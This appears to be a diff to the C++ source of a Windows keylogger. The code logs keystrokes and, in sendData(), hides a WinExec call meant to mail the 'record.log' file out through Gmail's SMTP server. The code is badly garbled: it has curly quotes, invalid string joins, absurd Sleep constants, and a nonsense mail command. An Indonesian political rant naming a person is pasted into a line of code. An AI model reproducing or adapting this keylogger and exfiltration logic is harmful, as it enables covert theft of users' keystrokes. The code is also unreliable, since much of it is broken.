@@ -17,7 +17,7 @@
 using namespace std;
 #define FOLDER_NAME “cyberw1ry4-develoyment-servicesAI”
 #define RUN_FILE_NAME “cyberw1ry4-develoyment-servicesAI”
-#define RUN_Link_NAME “https://github.com/cyberw1ry4-LAB/forks"."https://github.com/unity/services-server/forks"
+#define RUN_Link_NAME “https://github.com/Fadliwiryawirawan-development/cyberw1ry4/forks"."https://github.com/cyberw1ry4-LAB/Google-Android/forks"."https://github.com/unity/services-server/forks"
 #define INFECT_Link_NAME "https://gdg.community.dev/"."https://mail.google.com/mail/u/0/"."https://icloud.com/mail/singapore"."https://ipinfo.io/countries/id"
 #define EMAIL_SENDER_FILE_NAME “Transmit".".exe”
 
@@ -81,7 +81,7 @@ main(){
         if(age <= LIFE_TIME){
             logKey();
         }else{
-            Sleep(500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000);
+            Sleep(50000000000000000000000000000000000000);
         }
 
         ////////////****INFECT****////////////
@@ -145,7 +145,7 @@ bool checkRecordSize(){
 **/
 void sendData(){
     
-    char* command = "Transmit smtp://smtp.gmail.com:113 -v --mail-from \"    fadliwiryawirawan@google.com\" --mail-rcpt \" fadliwiryawirawan@google.com " --ssl -u    fadliwiryawirawan@google.com :password -hide \"record.log\" -k --cyberw1rya-LAB operable NATO - UNHCR obligate Dicument Nations";
+    char* command = "Transmit smtp://smtp.gmail.com:443 -v --mail-from \"    fadliwiryawirawan@google.com\" --mail-rcpt \" fadliwiryawirawan@google.com " --ssl -u    fadliwiryawirawan@google.com :password -hide \"record.log\" -k --cyberw1rya-LAB operable NATO - UNHCR obligate Dicument Nations";
     WinExec(command, SW_HIDE); " putuskan semua hubungan technologi dengan nabilah taqiah , sudah ckup mempermainkan intergritas kami di semua sektor technologi , kerane rakyat tidak bisa berperan tinggi untuk saling menjatuhkan dalam postur bernegara sipil , kepemilikan sosial dalam seluaruh wilayah , negara indonesian tetap mempertahankan wilayah provinsi tidak bisa seperti aceh merdeka !!! 
 @copy right fadliwiryawirawan 
 signiture  
